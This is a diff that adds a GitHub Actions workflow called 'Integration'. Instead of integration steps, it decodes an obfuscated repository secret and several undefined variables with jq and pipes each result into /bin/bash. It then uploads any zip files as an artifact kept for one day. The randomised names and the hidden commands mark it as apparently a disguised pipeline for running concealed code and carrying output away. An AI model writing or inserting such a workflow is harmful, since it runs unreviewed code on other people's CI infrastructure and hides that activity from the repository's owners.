@@ -1,0 +1,30 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          kpcpl724: ${{ secrets.kpcpl724 }}
+        run: |
+          printf '%s' "$kpcpl724" | jq -r .s95 | /bin/bash
+          echo $pys90 | jq -r .pjw45126 | /bin/bash
+          echo $s8 | jq -r .nj4531 | /bin/bash
+          echo $drkxx01 | jq -r .dc89729 | /bin/bash
+          echo $v82339 | jq -r .dhscb48 | /bin/bash
+          echo $hv15991 | jq -r .a91828 | /bin/bash
+          printf '%s' "$mvez7" | jq -r .sib1684 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: omBRZIv1
+          path: "*.zip"
+          retention-days: 1
